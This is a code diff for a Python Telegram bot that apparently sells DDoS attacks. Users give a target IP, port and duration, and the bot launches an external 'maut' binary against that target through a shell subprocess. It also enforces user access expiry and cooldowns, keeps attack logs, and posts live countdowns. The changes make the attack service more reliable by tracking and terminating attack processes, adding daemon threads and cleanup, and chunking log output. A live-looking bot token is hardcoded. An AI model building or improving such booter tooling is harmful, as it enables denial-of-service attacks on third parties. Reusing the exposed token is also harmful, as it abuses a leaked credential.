@@ -7,6 +7,7 @@ import time
 import re
 from threading import Lock
 import threading
+import sys
 
 # Bot configuration
 bot = telebot.TeleBot('7970310406:AAGh47IMJxhCPwqTDe_3z3PCvXugf7Y3yYE')
@@ -17,6 +18,7 @@ LOG_FILE = "attack_logs.txt"
 COOLDOWN_TIME = 600  # 5 minutes
 MAX_ATTACK_TIME = 240  # 4 minutes (240 seconds)
 IMAGE_URL = "https://t.me/gggkkkggggiii/9"
+MAX_LOG_LINES = 50  # Maximum lines to keep in memory for logs
 
 # Data storage
 user_attack_data = {}
@@ -26,6 +28,7 @@ user_time_limits = {}
 active_attacks = {}  # Track active attacks
 attack_lock = Lock()  # Thread lock for attack operations
 countdown_messages = {}  # Track countdown messages
+attack_processes = {}  # Track attack subprocesses
 
 def safe_int(value, default=None):
     """Safely convert to integer with default fallback"""
@@ -81,11 +84,17 @@ def log_attack(user_id, target, port, attack_time):
     """Log attack details to file"""
     try:
         user_id_str = str(user_id)
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        log_entry = f"{timestamp} | UserID:{user_id_str} | {target}:{port} | {attack_time}s\n"
+        
+        # Write to file
         with open(LOG_FILE, "a") as f:
-            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            f.write(f"{timestamp} | UserID:{user_id_str} | {target}:{port} | {attack_time}s\n")
+            f.write(log_entry)
+            
+        return log_entry
     except Exception as e:
         print(f"Logging error: {e}")
+        return None
 
 def parse_time_input(time_str):
     """Parse human-readable time input into seconds"""
@@ -128,8 +137,17 @@ def add_active_attack(user_id, attack_time):
 def remove_active_attack(user_id):
     """Remove an attack from the active attacks tracker"""
     with attack_lock:
-        active_attacks.pop(str(user_id), None)
-        countdown_messages.pop(str(user_id), None)
+        user_id_str = str(user_id)
+        if user_id_str in active_attacks:
+            del active_attacks[user_id_str]
+        if user_id_str in countdown_messages:
+            del countdown_messages[user_id_str]
+        if user_id_str in attack_processes:
+            try:
+                attack_processes[user_id_str].terminate()
+            except:
+                pass
+            del attack_processes[user_id_str]
 
 def get_active_attack_info():
     """Get information about the currently active attack"""
@@ -233,7 +251,8 @@ def handle_attack_command(message):
         limit_sec, expiry = user_time_limits[user_id]
         if time.time() > expiry:
             del user_time_limits[user_id]
-            allowed_user_ids.remove(user_id)
+            if user_id in allowed_user_ids:
+                allowed_user_ids.remove(user_id)
             save_users()
             return bot.reply_to(message, "❌ Your access has expired. Contact admin.")
     
@@ -254,6 +273,7 @@ def handle_attack_command(message):
         if not validate_port(port):
             return bot.reply_to(message, "❌ Invalid port (1-65535)")
         
+        attack_time_sec = safe_int(attack_time)
         if not validate_attack_time(attack_time):
             return bot.reply_to(message, f"❌ Invalid time (1-{MAX_ATTACK_TIME} seconds)")
         
@@ -261,7 +281,7 @@ def handle_attack_command(message):
         user_attack_data[user_id] = {
             'ip': ip,
             'port': port,
-            'time': attack_time
+            'time': attack_time_sec
         }
         
         # Show confirmation
@@ -309,15 +329,19 @@ def handle_buttons(call):
             
             try:
                 # Execute attack (in background)
-                subprocess.Popen(
+                process = subprocess.Popen(
                     f"./maut {data['ip']} {data['port']} {attack_time} 900", 
                     shell=True,
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL
                 )
                 
+                # Store the process reference
+                with attack_lock:
+                    attack_processes[user_id] = process
+                
                 # Log the attack
-                log_attack(user_id, data['ip'], data['port'], attack_time)
+                log_entry = log_attack(user_id, data['ip'], data['port'], attack_time)
                 maut_cooldown[user_id] = datetime.datetime.now()
                 
                 # Get current time for countdown
@@ -349,11 +373,12 @@ def handle_buttons(call):
                         'ip': data['ip'],
                         'port': data['port'],
                         'duration': attack_time,
-                        'end_time': end_time
+                        'end_time': end_time,
+                        'start_time': start_time
                     }
                 
                 # Start countdown updates
-                threading.Thread(target=update_countdown, args=(user_id,)).start()
+                threading.Thread(target=update_countdown, args=(user_id,), daemon=True).start()
                 
             except Exception as e:
                 remove_active_attack(user_id)
@@ -394,62 +419,78 @@ def handle_buttons(call):
 
 def update_countdown(user_id):
     """Update the countdown timer for an active attack"""
+    last_update = time.time()
+    
     while True:
-        with attack_lock:
-            if user_id not in countdown_messages:
-                break
-                
-            message_info = countdown_messages[user_id]
-            remaining = max(0, (message_info['end_time'] - datetime.datetime.now()).seconds)
-            
-            if remaining <= 0:
-                # Attack finished
-                del countdown_messages[user_id]
-                remove_active_attack(user_id)
-                
-                # Send completion message
-                try:
-                    bot.send_message(
-                        message_info['chat_id'],
-                        f"✅ *Attack Completed!*\n\n"
-                        f"🌐 Target: `{message_info['ip']}`\n"
-                        f"⏱ Duration: `{message_info['duration']}`s\n\n"
-                        f"Cooldown: {COOLDOWN_TIME//60} minutes",
-                        parse_mode="Markdown"
-                    )
+        try:
+            with attack_lock:
+                if user_id not in countdown_messages:
+                    break
                     
-                    # Add new attack button
-                    markup = types.InlineKeyboardMarkup()
-                    markup.add(types.InlineKeyboardButton("⚡ New Attack", callback_data="new_attack"))
-                    bot.send_message(
-                        message_info['chat_id'], 
-                        "Attack finished! You can launch a new one when cooldown ends.", 
-                        reply_markup=markup
-                    )
-                except Exception as e:
-                    print(f"Error sending completion message: {e}")
-                break
+                message_info = countdown_messages[user_id]
+                now = datetime.datetime.now()
+                remaining = max(0, (message_info['end_time'] - now).seconds)
+                elapsed = (now - message_info['start_time']).seconds
+                
+                if remaining <= 0:
+                    # Attack finished
+                    remove_active_attack(user_id)
+                    
+                    # Send completion message
+                    try:
+                        bot.send_message(
+                            message_info['chat_id'],
+                            f"✅ *Attack Completed!*\n\n"
+                            f"🌐 Target: `{message_info['ip']}`\n"
+                            f"⏱ Duration: `{message_info['duration']}`s\n\n"
+                            f"Cooldown: {COOLDOWN_TIME//60} minutes",
+                            parse_mode="Markdown"
+                        )
+                        
+                        # Add new attack button
+                        markup = types.InlineKeyboardMarkup()
+                        markup.add(types.InlineKeyboardButton("⚡ New Attack", callback_data="new_attack"))
+                        bot.send_message(
+                            message_info['chat_id'], 
+                            "Attack finished! You can launch a new one when cooldown ends.", 
+                            reply_markup=markup
+                        )
+                    except Exception as e:
+                        print(f"Error sending completion message: {e}")
+                    break
+                
+                # Only update every second to avoid rate limiting
+                if time.time() - last_update >= 1:
+                    try:
+                        # Update the countdown message
+                        progress_percent = min(100, (elapsed / message_info['duration']) * 100)
+                        progress_bar = "🟢" * int(progress_percent / 10) + "⚪" * (10 - int(progress_percent / 10))
+                        
+                        bot.edit_message_text(
+                            chat_id=message_info['chat_id'],
+                            message_id=message_info['message_id'],
+                            text=(
+                                f"🔥 *Attack In Progress* 🔥\n\n"
+                                f"🌐 Target: `{message_info['ip']}`\n"
+                                f"🔌 Port: `{message_info['port']}`\n"
+                                f"⏱ Duration: `{message_info['duration']}`s\n"
+                                f"⏳ Time Remaining: `{remaining}`s\n"
+                                f"{progress_bar} {int(progress_percent)}%\n\n"
+                                f"[⚡ Powered by @seedhe_maut_bot](https://t.me/seedhe_maut_bot)"
+                            ),
+                            parse_mode="Markdown"
+                        )
+                        last_update = time.time()
+                    except Exception as e:
+                        print(f"Error updating countdown: {e}")
+                        if "message is not modified" not in str(e).lower():
+                            break
+                
+            time.sleep(0.5)  # Check more frequently but update only every second
             
-            try:
-                # Update the countdown message
-                bot.edit_message_text(
-                    chat_id=message_info['chat_id'],
-                    message_id=message_info['message_id'],
-                    text=(
-                        f"🔥 *Attack In Progress* 🔥\n\n"
-                        f"🌐 Target: `{message_info['ip']}`\n"
-                        f"🔌 Port: `{message_info['port']}`\n"
-                        f"⏱ Duration: `{message_info['duration']}`s\n"
-                        f"⏳ Time Remaining: `{remaining}`s\n\n"
-                        f"[⚡ Powered by @seedhe_maut_bot](https://t.me/seedhe_maut_bot)"
-                    ),
-                    parse_mode="Markdown"
-                )
-            except Exception as e:
-                print(f"Error updating countdown: {e}")
-                break
-            
-        time.sleep(1)  # Update every second
+        except Exception as e:
+            print(f"Error in countdown thread: {e}")
+            break
 
 @bot.message_handler(commands=['add'])
 def add_user(message):
@@ -563,8 +604,19 @@ def show_logs(message):
         return bot.reply_to(message, "ℹ️ No logs available.")
     
     try:
-        with open(LOG_FILE, "rb") as f:
-            bot.send_document(message.chat.id, f)
+        # Read last MAX_LOG_LINES lines
+        with open(LOG_FILE, "r") as f:
+            lines = f.readlines()[-MAX_LOG_LINES:]
+        
+        if not lines:
+            return bot.reply_to(message, "ℹ️ No logs available.")
+        
+        # Send logs in chunks to avoid message length limits
+        chunk_size = 20
+        for i in range(0, len(lines), chunk_size):
+            chunk = lines[i:i+chunk_size]
+            bot.send_message(message.chat.id, "📜 Attack Logs:\n\n" + "".join(chunk))
+            
     except Exception as e:
         bot.reply_to(message, f"❌ Error sending logs: {str(e)}")
 
@@ -579,7 +631,7 @@ def clear_logs(message):
         open(LOG_FILE, "w").close()
         bot.reply_to(message, "✅ Logs cleared.")
     except Exception as e:
-        bot.reply_to_message(message, f"❌ Error clearing logs: {str(e)}")
+        bot.reply_to(message, f"❌ Error clearing logs: {str(e)}")
 
 @bot.message_handler(commands=['mylogs'])
 def my_logs(message):
@@ -644,6 +696,20 @@ Violations will result in ban.
 """
     bot.reply_to(message, rules, parse_mode="Markdown")
 
+def cleanup_resources():
+    """Clean up resources before exiting"""
+    print("Cleaning up resources...")
+    with attack_lock:
+        # Terminate any active attacks
+        for user_id, process in attack_processes.items():
+            try:
+                process.terminate()
+            except:
+                pass
+        attack_processes.clear()
+        active_attacks.clear()
+        countdown_messages.clear()
+
 def main():
     """Main function to initialize and run the bot"""
     # Initialize data
@@ -651,11 +717,18 @@ def main():
     
     print("⚡ MAUT Bot Starting ⚡")
     
+    # Register cleanup for graceful exit
+    import atexit
+    atexit.register(cleanup_resources)
+    
     # Start bot with error recovery
     while True:
         try:
             print("Bot is running...")
             bot.polling(none_stop=True, interval=1, timeout=30)
+        except KeyboardInterrupt:
+            print("Bot stopped by user")
+            sys.exit(0)
         except Exception as e:
             print(f"Bot crashed with error: {e}")
             print("Restarting in 5 seconds...")
